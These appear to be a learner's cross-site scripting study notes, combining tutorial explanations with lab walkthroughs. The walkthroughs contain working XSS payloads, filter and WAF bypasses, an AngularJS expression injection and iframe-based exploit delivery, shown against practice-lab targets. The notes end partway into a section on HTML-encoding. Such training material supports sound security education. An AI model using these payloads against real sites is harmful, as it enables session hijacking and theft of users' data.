## What is cross-site scripting (XSS)?

Cross-site scripting (also known as XSS) is a web security vulnerability that allows an attacker to compromise the interactions that users have with a vulnerable application. It allows an attacker to circumvent the same origin policy, which is designed to segregate different websites from each other. Cross-site scripting vulnerabilities normally allow an attacker to masquerade as a victim user, to carry out any actions that the user is able to perform, and to access any of the user's data. If the victim user has privileged access within the application, then the attacker might be able to gain full control over all of the application's functionality and data.
### How does XSS work?

Cross-site scripting works by manipulating a vulnerable web site so that it returns malicious JavaScript to users. When the malicious code executes inside a victim's browser, the attacker can fully compromise their interaction with the application. 

### XSS proof of concept

You can confirm most kinds of XSS vulnerability by injecting a payload that causes your own browser to execute some arbitrary JavaScript. It's long been common practice to use the alert() function for this purpose because it's short, harmless, and pretty hard to miss when it's successfully called. In fact, you solve the majority of our XSS labs by invoking alert() in a simulated victim's browser. 

### What are the types of XSS attacks?

There are three main types of XSS attacks. These are:

-    Reflected XSS, where the malicious script comes from the current HTTP request.
-    Stored XSS, where the malicious script comes from the website's database.
-    DOM-based XSS, where the vulnerability exists in client-side code rather than server-side code.

### What can XSS be used for?

An attacker who exploits a cross-site scripting vulnerability is typically able to:

-    Impersonate or masquerade as the victim user.
-    Carry out any action that the user is able to perform.
-    Read any data that the user is able to access.
-    Capture the user's login credentials.
-    Perform virtual defacement of the web site.
-    Inject trojan functionality into the web site.

### How to find and test for XSS vulnerabilities


Manually testing for reflected and stored XSS normally involves submitting some simple unique input (such as a short alphanumeric string) into every entry point in the application, identifying every location where the submitted input is returned in HTTP responses, and testing each location individually to determine whether suitably crafted input can be used to execute arbitrary JavaScript. In this way, you can determine the context in which the XSS occurs and select a suitable payload to exploit it.

Manually testing for DOM-based XSS arising from URL parameters involves a similar process: placing some simple unique input in the parameter, using the browser's developer tools to search the DOM for this input, and testing each location to determine whether it is exploitable. However, other types of DOM XSS are harder to detect. To find DOM-based vulnerabilities in non-URL-based input (such as document.cookie) or non-HTML-based sinks (like setTimeout), there is no substitute for reviewing JavaScript code, which can be extremely time-consuming. Burp Suite's web vulnerability scanner combines static and dynamic analysis of JavaScript to reliably automate the detection of DOM-based vulnerabilities. 

## Reflected XSS

Reflected cross-site scripting (or XSS) arises when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.

Suppose a website has a search function which receives the user-supplied search term in a URL parameter:

`https://insecure-website.com/search?term=gift`

The application echoes the supplied search term in the response to this URL:

`<p>You searched for: gift</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:

`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`

This URL results in the following response:

`<p>You searched for: <script>/* Bad stuff here... */</script></p>`

If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application. 

### Lab: Reflected XSS into HTML context with nothing encoded

To solve the lab, perform a cross-site scripting attack that calls the alert function. 

Payload: `<script>alert(1)</script>`

### Impact of reflected XSS attacks

If an attacker can control a script that is executed in the victim's browser, then they can typically fully compromise that user. Amongst other things, the attacker can:

-    Perform any action within the application that the user can perform.
-    View any information that the user is able to view.
-    Modify any information that the user is able to modify.
-    Initiate interactions with other application users, including malicious attacks, that will appear to originate from the initial victim user.

There are various means by which an attacker might induce a victim user to make a request that they control, to deliver a reflected XSS attack. These include placing links on a website controlled by the attacker, or on another website that allows content to be generated, or by sending a link in an email, tweet or other message. The attack could be targeted directly against a known user, or could be an indiscriminate attack against any users of the application.

The need for an external delivery mechanism for the attack means that the impact of reflected XSS is generally less severe than stored XSS, where a self-contained attack can be delivered within the vulnerable application itself. 

### How to find and test for reflected XSS vulnerabilities

The vast majority of reflected cross-site scripting vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner.

Testing for reflected XSS vulnerabilities manually involves the following steps:

-    **Test every entry point**. Test separately every entry point for data within the application's HTTP requests. This includes parameters or other data within the URL query string and message body, and the URL file path. It also includes HTTP headers, although XSS-like behavior that can only be triggered via certain HTTP headers may not be exploitable in practice.
-    **Submit random alphanumeric values**. For each entry point, submit a unique random value and determine whether the value is reflected in the response. The value should be designed to survive most input validation, so needs to be fairly short and contain only alphanumeric characters. But it needs to be long enough to make accidental matches within the response highly unlikely. A random alphanumeric value of around 8 characters is normally ideal. 
-    **Determine the reflection context**. For each location within the response where the random value is reflected, determine its context. This might be in text between HTML tags, within a tag attribute which might be quoted, within a JavaScript string, etc.
-    **Test a candidate payload**. Based on the context of the reflection, test an initial candidate XSS payload that will trigger JavaScript execution if it is reflected unmodified within the response. The easiest way to test payloads is to send the request to Burp Repeater, modify the request to insert the candidate payload, issue the request, and then review the response to see if the payload worked. An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.
-    **Test alternative payloads**. If the candidate XSS payload was modified by the application, or blocked altogether, then you will need to test alternative payloads and techniques that might deliver a working XSS attack based on the context of the reflection and the type of input validation that is being performed. For more details, see cross-site scripting contexts
-    **Test the attack in a browser**. Finally, if you succeed in finding a payload that appears to work within Burp Repeater, transfer the attack to a real browser by pasting the URL into the address bar, or by modifying the request in Burp Proxy's intercept view, and see if the injected JavaScript is indeed executed. Often, it is best to execute some simple JavaScript like `alert(document.domain)` which will trigger a visible popup within the browser if the attack succeeds.

## Stored XSS

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```
After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
`<p>This post was extremely helpful.</p>`

Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
`<script>/* Bad stuff here... */</script>`

Within the attacker's request, this comment would be URL-encoded as:
`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E`

Any user who visits the blog post will now receive the following within the application's response:
`<p><script>/* Bad stuff here... */</script></p>`

The script supplied by the attacker will then execute in the victim user's browser, in the context of their session with the application. 

### Lab: Stored XSS into HTML context with nothing encoded

To solve this lab, submit a comment that calls the alert function when the blog post is viewed. 

Payload: `<script>alert(1)</script>`

### How to find and test for stored XSS vulnerabilities

Many stored XSS vulnerabilities can be found using Burp Suite's web vulnerability scanner.

Testing for stored XSS vulnerabilities manually can be challenging. You need to test all relevant "entry points" via which attacker-controllable data can enter the application's processing, and all "exit points" at which that data might appear in the application's responses.

Entry points into the application's processing include:

-    Parameters or other data within the URL query string and message body.
-    The URL file path.
-    HTTP request headers that might not be exploitable in relation to reflected XSS.
-    Any out-of-band routes via which an attacker can deliver data into the application. The routes that exist depend entirely on the functionality implemented by the application: a webmail application will process data received in emails; an application displaying a Twitter feed might process data contained in third-party tweets; and a news aggregator will include data originating on other web sites.

The exit points for stored XSS attacks are all possible HTTP responses that are returned to any kind of application user in any situation.

The first step in testing for stored XSS vulnerabilities is to locate the links between entry and exit points, whereby data submitted to an entry point is emitted from an exit point. The reasons why this can be challenging are that:

 -   Data submitted to any entry point could in principle be emitted from any exit point. For example, user-supplied display names could appear within an obscure audit log that is only visible to some application users.
 -   Data that is currently stored by the application is often vulnerable to being overwritten due to other actions performed within the application. For example, a search function might display a list of recent searches, which are quickly replaced as users perform other searches.

To comprehensively identify links between entry and exit points would involve testing each permutation separately, submitting a specific value into the entry point, navigating directly to the exit point, and determining whether the value appears there. However, this approach is not practical in an application with more than a few pages.

Instead, a more realistic approach is to work systematically through the data entry points, submitting a specific value into each one, and monitoring the application's responses to detect cases where the submitted value appears. Particular attention can be paid to relevant application functions, such as comments on blog posts. When the submitted value is observed in a response, you need to determine whether the data is indeed being stored across different requests, as opposed to being simply reflected in the immediate response.

When you have identified links between entry and exit points in the application's processing, each link needs to be specifically tested to detect if a stored XSS vulnerability is present. This involves determining the context within the response where the stored data appears and testing suitable candidate XSS payloads that are applicable to that context. At this point, the testing methodology is broadly the same as for finding reflected XSS vulnerabilities. 

## DOM-based XSS
 DOM-based XSS vulnerabilities usually arise when JavaScript takes data from an attacker-controllable source, such as the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML. This enables attackers to execute malicious JavaScript, which typically allows them to hijack other users' accounts.

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.

The most common source for DOM XSS is the URL, which is typically accessed with the window.location object. An attacker can construct a link to send a victim to a vulnerable page with a payload in the query string and fragment portions of the URL. In certain circumstances, such as when targeting a 404 page or a website running PHP, the payload can also be placed in the path. 

### How to test for DOM-based cross-site scripting

The majority of DOM XSS vulnerabilities can be found quickly and reliably using Burp Suite's web vulnerability scanner. To test for DOM-based cross-site scripting manually, you generally need to use a browser with developer tools, such as Chrome. You need to work through each available source in turn, and test each one individually.
**Testing HTML sinks**

To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as location.search), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. In Chrome's developer tools, you can use Control+F (or Command+F on MacOS) to search the DOM for your string.

For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute then try to inject double quotes in your string to see if you can break out of the attribute.

Note that browsers behave differently with regards to URL-encoding, Chrome, Firefox, and Safari will URL-encode location.search and location.hash, while IE11 and Microsoft Edge (pre-Chromium) will not URL-encode these sources. If your data gets URL-encoded before being processed, then an XSS attack is unlikely to work.
**Testing JavaScript execution sinks**

Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.

For each potential source, such as location, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use Control+Shift+F (or Command+Alt+F on MacOS) to search all the page's JavaScript code for the source.

Once you've found where the source is being read, you can use the JavaScript debugger to add a break point and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack. 

### Exploiting DOM XSS with different sources and sinks

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink. In practice, different sources and sinks have differing properties and behavior that can affect exploitability, and determine what techniques are necessary. Additionally, the website's scripts might perform validation or other processing of data that must be accommodated when attempting to exploit a vulnerability. There are a variety of sinks that are relevant to DOM-based vulnerabilities. Please refer to the list below for details.

`document.write` is a method in JavaScript used to write content directly to the HTML document stream. It is part of the Document Object Model (DOM) and is commonly used to dynamically insert text, HTML, or JavaScript into a web page during its rendering process.
`document.write('... <script>alert(document.domain)</script> ...');`


`location.search` is a JavaScript property that retrieves the query string part of the current URL. The query string is the portion of the URL that comes after the `?` symbol and typically contains key-value pairs used to pass data to the web page.
### Lab: DOM XSS in document.write sink using source location.search

This lab contains a DOM-based cross-site scripting vulnerability in the search query tracking functionality. It uses the JavaScript `document.write` function, which writes data out to the page. The `document.write` function is called with data from `location.search`, which you can control using the website URL.

To solve this lab, perform a cross-site scripting attack that calls the alert function. 
```js
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
```
This function takes a query parameter and dynamically inserts an `<img>` tag into the document.
The `src` attribute of the `<img>` tag includes a searchTerms parameter, appending the value of query to the tracking URL.
```js
    var query = (new URLSearchParams(window.location.search)).get('search');
```
- `window.location.search` retrieves the query string part of the - URL (e.g., ?search=test).
- `URLSearchParams` is used to parse the query string.
- The `.get('search')` method retrieves the value of the search parameter. For example:
  -    URL: https://example.com/?search=test123
  -    query will be "test123".



When entering the string `test123`, the website returned the following HTML:

`<img src="/resources/images/tracker.gif?searchTerms=test123" jt11wq1q5="">`

From this, I determined that it is possible to escape the input and trigger an alert by using the following payload: `"><svg onload=alert(1)>`

The browser loads the `<svg>` element, triggering the onload event, which then executes the `alert(1)` JavaScript code.

Note, however, that in some situations the content that is written to document.write includes some surrounding context that you need to take account of in your exploit. For example, you might need to close some existing elements before using your JavaScript payload. 

### Lab: DOM XSS in document.write sink using source location.search inside a select element

To solve this lab, perform a cross-site scripting attack that breaks out of the select element and calls the alert function. 
```js
var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
  document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
  if (stores[i] === store) {
    continue;
  }
  document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

For example, the string `test` will be
```html
<select name="storeId">
    <option selected="">test</option>
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
</select>
```

Our goal is to trigger an alert by the payload so the html should looks like this:

```html
<select name="storeId">
    <option selected="">test</option>
</select>

<svg "onload=alert(1)">

<select>
    <option>London</option>
    <option>Paris</option>
    <option>Milan</option>
</select>
```
So, the final payload is:

`test</select><svg onload=alert(1)><select>`

### Lab: DOM XSS in innerHTML sink using source location.search

To solve this lab, perform a cross-site scripting attack that calls the alert function.

The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire. This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements. For example:

`element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'`

The payload is: `<img src=1 onerror=alert(1)>`

### Sources and sinks in third-party dependencies

Modern web applications are typically built using a number of third-party libraries and frameworks, which often provide additional functions and capabilities for developers. It's important to remember that some of these are also potential sources and sinks for DOM XSS. 

**DOM XSS in jQuery**

If a JavaScript library such as jQuery is being used, look out for sinks that can alter DOM elements on the page. For instance, jQuery's attr() function can change the attributes of DOM elements. If data is read from a user-controlled source like the URL, then passed to the attr() function, then it may be possible to manipulate the value sent to cause XSS. For example, here we have some JavaScript that changes an anchor element's href attribute using data from the URL:
```
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```
You can exploit this by modifying the URL so that the `location.search source` contains a malicious JavaScript URL. After the page's JavaScript applies this malicious URL to the back link's href, clicking on the back link will execute it:

`?returnUrl=javascript:alert(document.domain)`

### Lab: DOM XSS in jQuery anchor href attribute sink using location.search source
This lab contains a DOM-based cross-site scripting vulnerability in the submit feedback page. It uses the jQuery library's `$` selector function to find an anchor element, and changes its href attribute using data from `location.search`.

To solve this lab, make the "back" link alert `document.cookie`.

```js
$(function() {
    $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});
```
Exploit URL to solve the lab: `?returnPath=javascript:alert(document.cookie)`


```html
<a id="backLink" href="javascript:alert(document.cookie)">Back</a>
```
### Lab: DOM XSS in jQuery selector sink using a hashchange event

This lab contains a DOM-based cross-site scripting vulnerability on the home page. It uses jQuery's `$()` selector function to auto-scroll to a given post, whose title is passed via the `location.hash` property.

To solve the lab, deliver an exploit to the victim that calls the print() function in their browser. 

Another potential sink to look out for is jQuery's `$()` selector function, which can be used to inject malicious objects into the DOM.

jQuery used to be extremely popular, and a classic DOM XSS vulnerability was caused by websites using this selector in conjunction with the `location.hash` source for animations or auto-scrolling to a particular element on the page. This behavior was often implemented using a vulnerable hashchange event handler, similar to the following:
```js
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```
As the hash is user controllable, an attacker could use this to inject an XSS vector into the `$()` selector sink.

To actually exploit this classic vulnerability, you'll need to find a way to trigger a hashchange event without user interaction. One of the simplest ways of doing this is to deliver your exploit via an iframe:

`<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">`

In this example, the `src` attribute points to the vulnerable page with an empty hash value. When the iframe is loaded, an XSS vector is appended to the hash, causing the hashchange event to fire. 

```js
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```              
The `hashchange` event listener is triggered whenever the `window.location.hash changes`.

The `decodeURIComponent(window.location.hash.slice(1))` extracts and decodes the hash value (after the # character).

The extracted value is used to construct a jQuery selector with the `:contains()` filter:

`$('section.blog-list h2:contains(' + <decoded_hash_value> + ')');`

If an element matches the selector, the `scrollIntoView()` function scrolls it into view.

With the URL `#<img src=x onerror=alert(1)>`, the `<img>` tag is added to the DOM, and the onerror handler executes the `alert(1)` JavaScript.

Now we can construct the payload for the lab as: 

`<iframe src="https://0a2b00b0043fc0af8201331200c10010.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>`

The exploit works as follows:

-    The iframe loads the target URL with an empty hash (#).
-    The onload attribute modifies the iframe's src attribute, appending a malicious hash containing an XSS vector `<img src=x onerror=print()`>.
-    This triggers the hashchange event handler in the page's JavaScript, injecting the malicious HTML into the DOM and executing the `print()` code.


### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

This lab contains a DOM-based cross-site scripting vulnerability in a AngularJS expression within the search functionality.

AngularJS is a popular JavaScript library, which scans the contents of HTML nodes containing the ng-app attribute (also known as an AngularJS directive). When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces. This technique is useful when angle brackets are being encoded.

To solve this lab, perform a cross-site scripting attack that executes an AngularJS expression and calls the alert function. 

We can noticed that 
```html
<body ng-app="" class="ng-scope">
...
</body>
```
and what that means it that every where in the body scope, we're able to execute js code, eg `{{7 * 7}}` would return 49

The final payload is `{{$on.constructor('alert(1)')()}}`

### DOM XSS combined with reflected and stored data

Some pure DOM-based vulnerabilities are self-contained within a single page. If a script reads some data from the URL and writes it to a dangerous sink, then the vulnerability is entirely client-side.

However, sources aren't limited to data that is directly exposed by browsers - they can also originate from the website. For example, websites often reflect URL parameters in the HTML response from the server. This is commonly associated with normal XSS, but it can also lead to reflected DOM XSS vulnerabilities.

In a reflected DOM XSS vulnerability, the server processes data from the request, and echoes the data into the response. The reflected data might be placed into a JavaScript string literal, or a data item within the DOM, such as a form field. A script on the page then processes the reflected data in an unsafe way, ultimately writing it to a dangerous sink.

`eval('var data = "reflected string"');`

### Lab: Reflected DOM XSS

To solve this lab, create an injection that calls the alert() function. 

In the `searchResult.js`, we can indicate that the `search()` function makes an AJAX request to the server with the query parameters from `window.location.search`.
When the server responds, the response is passed to `eval()`:

`eval('var searchResultsObj = ' + this.responseText);`

For `GET /search-results?search=test`, the response is `{"results":[],"searchTerm":"test"}`

This becomes the input to eval():

`eval('var searchResultsObj = {"results":[],"searchTerm":"test"}');`

Our goal is to construct a payload that breaks out of the string context and executes `alert(1)` such as:

`eval('var searchResultsObj = {"results":[],"searchTerm":""} ;alert(1);//"}');`

Noticed that when the JSON response attempts to escape the `"`, it adds a `\`. The resulting `\\` causes the escaping to be effectively canceled out. This means that the double-quotes are processed unescaped, which closes the string that should contain the search term. 

The final payload is: `\"-alert(1)}//`

- `\"`:Escapes the enclosing double-quote of the JSON string and prematurely closes the searchTerm value.

- `-alert(1)`:       The `-` operator avoids requiring an additional + or ; for valid JavaScript syntax. This keeps the injected code compact and ensures it doesn't conflict with the JSON structure.

- `}`:
    Closes the JSON object 

- `//`:
    Comments out the remainder of the generated JavaScript code to avoid parsing issues.

When valuate, it become `{"results":[],"searchTerm":"\\"alert(1)}//"}`

### Lab: Stored DOM XSS

This lab demonstrates a stored DOM vulnerability in the blog comment functionality. To solve this lab, exploit this vulnerability to call the alert() function. 

Websites may also store data on the server and reflect it elsewhere. In a stored DOM XSS vulnerability, the server receives data from one request, stores it, and then includes the data in a later response. A script within the later response contains a sink which then processes the data in an unsafe way.

`element.innerHTML = comment.author`



In an attempt to prevent XSS, the website uses the JavaScript replace() function to encode angle brackets. However, when the first argument is a string, the function only replaces the first occurrence. We exploit this vulnerability by simply including an extra set of angle brackets at the beginning of the comment. These angle brackets will be encoded, but any subsequent angle brackets will be unaffected, enabling us to effectively bypass the filter and inject HTML. 

`<><img src=1 onerror=alert(1)>`

## Which sinks can lead to DOM-XSS vulnerabilities?

The following are some of the main sinks that can lead to DOM-XSS vulnerabilities:
```
document.write()
document.writeln()
document.domain
element.innerHTML
element.outerHTML
element.insertAdjacentHTML
element.onevent
```
The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
```
add()
after()
append()
animate()
insertAfter()
insertBefore()
before()
html()
prepend()
replaceAll()
replaceWith()
wrap()
wrapInner()
wrapAll()
has()
constructor()
init()
index()
jQuery.parseHTML()
$.parseHTML()
```

## XSS between HTML tags

When testing for reflected and stored XSS, a key task is to identify the XSS context:

-    The location within the response where attacker-controllable data appears.
-    Any input validation or other processing that is being performed on that data by the application.

Based on these details, you can then select one or more candidate XSS payloads, and test whether they are effective. 
### Lab: Reflected XSS into HTML context with most tags and attributes blocked

To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function. 

First, to get the unblocked tag, use the tag list from the [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). we discovered that the body tag is not blocked

Next, we identified an unblocked attribute. One suitable option is `onresize`.

We can construct a payload: `<body onresize=print()>`

To automatically trigger the payload, we can add the onload attribute to modify the element's style dynamically: `onload=this.style.width='100px'`

The following input field, we can escape the input by appending `">` to the payload.:
```html
<input type="text" placeholder="Search the blog..." name="search">
```

The rendered html should be 
```html
<input type="text" placeholder="Search the blog...">
<body onresize=print()>" 
    onload=this.style.width='100px'>
    name="search">
```

The constructed payload is: `"><body onresize=print()>" onload=this.style.width='100px'>`

So the final payload is `<iframe src="https://0a7d004604e317cd808876a6008e001d.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>`

### Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.

To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`. 

With a custom tag `<custom-tag></custom-tag>`, the html rendered as:
```html
<h1>0 search results for '
    <custom-tag></custom-tag>
    '
</h1>
```
The payload `<custom-tag onmouseover='alert("test")'></custom-tag>` create a html as:
```html
<h1>0 search results for '
    <custom-tag onmouseover='alert("test")'></custom-tag>
    '
    </h1>
```
We can construct a payload like this:

`<custom-tag onfocus='alert(document.cookie)' id='pwned' tabindex='1'>`

So that whenever the tager visit the url `https://baseURL/?search=%3Ccustom-tag+onfocus%3D%27alert%28document.cookie%29%27+id%3D%27pwned%27+tabindex%3D%271%27%3E#pwned`

The onfocus event is triggered, executing `alert(document.cookie)`

Now we can make the target automatic visit the URL:
```html
<script>
location = 'https://0a3400a3045b5389806c17c000250047.web-security-academy.net/?search=%3Ccustom-tag+onfocus%3D%27alert(document.cookie)%27+id%3D%27pwned%27+tabindex%3D%271%27%3E#pwned'
</script>
```
### Lab: Reflected XSS with event handlers and href attributes blocked

This lab contains a reflected XSS vulnerability with some whitelisted tags, but all events and anchor href attributes are blocked.

To solve the lab, perform a cross-site scripting attack that injects a vector that, when clicked, calls the alert function.

Note that you need to label your vector with the word "Click" in order to induce the simulated lab user to click your vector. For example:

`<a href="">Click me</a>`

After fuzzing, the allowed tag are `a` and `animate` tag

The payload is: 
```html
<svg>
  <a>
    <animate attributeName=href values=javascript:alert(1) />
    <text x=20 y=20>Click me</text>
  </a>
</svg>
```
The `<animate>` tag is part of the SVG animation specification. It allows attributes of an element (in this case, href) to change.

The `<animate>` tag updates the href attribute of the `<a>` tag to `javascript:alert(1)`. When the user clicks on the text “Click me” (inside the `<a>` tag).
The browser executes the JavaScript `alert(1)`.

### Lab: Reflected XSS with some SVG markup allowed

This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.

To solve the lab, perform a cross-site scripting attack that calls the `alert()` function. 

After fuzzing, the allowed tags are: animatetransform, image, svg, title and the allowed event is only onbegin

The payload could be: `<svg><animatetransform onbegin=alert(1)>`

## XSS in HTML tag attributes

When the XSS context is into an HTML tag attribute value, you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one. For example:

`"><script>alert(document.domain)</script>`

More commonly in this situation, angle brackets are blocked or encoded, so your input cannot break out of the tag in which it appears. Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler. For example:

`" autofocus onfocus=alert(document.domain) x="`

The above payload creates an onfocus event that will execute JavaScript when the element receives the focus, and also adds the autofocus attribute to try to trigger the onfocus event automatically without any user interaction. Finally, it adds `x="` to gracefully repair the following markup. 

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded

This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the alert function. 

Input `test` in the search box, the html rendered as:
```html
<input type="text" placeholder="Search the blog..." name="search" value="test">
```
We could escape by adding `">`

The payload `"><img src=1 onerror=alert(1)>` rendered as    
```html
<input type="text" placeholder="Search the blog..." name="search" value="" &gt;&lt;img="" src="1" onerror="alert(1)>&quot;">
```

Note that the char `"` is not be encoded, so the payload could be `"onmouseover="alert(1)" pwned`

```html
<input type="text" placeholder="Search the blog..." name="search" value="" onmouseover="alert(1)" pwned"="">
```

### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality. To solve this lab, submit a comment that calls the `alert` function when the comment author name is clicked.

Sometimes the XSS context is into a type of HTML tag attribute that itself can create a scriptable context. Here, you can execute JavaScript without needing to terminate the attribute value. For example, if the XSS context is into the href attribute of an anchor tag, you can use the javascript pseudo-protocol to execute script. For example:

`<a href="javascript:alert(document.domain)">`

The html is     
```html
<a id="author" href="http://website.com">namehere</a>
```
We can change the website content to `javascript:alert(1)` and solve the lab.
```html
<a id="author" href="javascript:alert(1)">solvelab</a>
```

### Lab: Reflected XSS in canonical link tag


This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:

    ALT+SHIFT+X
    CTRL+ALT+X
    Alt+X

The payload is: `https://baseURL/?'accesskey='x'onclick='alert(1)`

## XSS into JavaScript

**Terminating the existing script**

In the simplest case, it is possible to simply close the script tag that is enclosing the existing JavaScript, and introduce some new HTML tags that will trigger execution of JavaScript. For example, if the XSS context is as follows:
```js
<script>
...
var input = 'controllable data here';
...
</script>
```
then you can use the following payload to break out of the existing JavaScript and execute your own:
`</script><img src=1 onerror=alert(document.domain)>`
### Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 

```html
<script>
    var searchTerms = 'test123';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

Payload: `</script><script>alert(1)</script><script> var searchTerms = \'`
```html
<script> var searchTerms = '</script>
<script>alert(1)</script>
<script> var searchTerms = \\\'';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```
**Breaking out of a JavaScript string**

In cases where the XSS context is inside a quoted string literal, it is often possible to break out of the string and execute JavaScript directly. It is essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing.

Some useful ways of breaking out of a string literal are:

`'-alert(document.domain)-'`

`';alert(document.domain)//`
### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded

This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 

Payload: `test'; alert(); var none = 'pwned`
### Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 

Some applications attempt to prevent input from breaking out of the JavaScript string by escaping any single quote characters with a backslash. A backslash before a character tells the JavaScript parser that the character should be interpreted literally, and not as a special character such as a string terminator. In this situation, applications often make the mistake of failing to escape the backslash character itself. This means that an attacker can use their own backslash character to neutralize the backslash that is added by the application.

For example, suppose that the input:
`';alert(document.domain)//`

gets converted to:
`\';alert(document.domain)//`

You can now use the alternative payload:
`\';alert(document.domain)//`

which gets converted to:
`\\';alert(document.domain)//`

Here, the first backslash means that the second backslash is interpreted literally, and not as a special character. This means that the quote is now interpreted as a string terminator, and so the attack succeeds. 
### Lab: Reflected XSS in a JavaScript URL with some characters blocked

To solve the lab, perform a cross-site scripting attack that calls the alert function with the string 1337 contained somewhere in the alert message. 
The payload is:

`'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'`

Explaination:

`'},x=x=>{`:

Closes the current JavaScript block and starts a new one by injecting an arrow function `x => {...}`.

`throw/**/onerror=alert,1337`:

Uses the throw statement to trigger an error, which assigns alert as the onerror handler and calls it with 1337 when the error occurs.
The /**/ replaces a space to bypass space filtering.

`},toString=x,window+''`:

Assigns the function x (which throws the error) to toString.
When the window object is coerced into a string (window+''), it triggers the toString method, which calls the x function.

`{x:'`:

Ensures the injected payload ends cleanly, avoiding syntax errors.
### Making use of HTML-encoding

When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around some input filters.

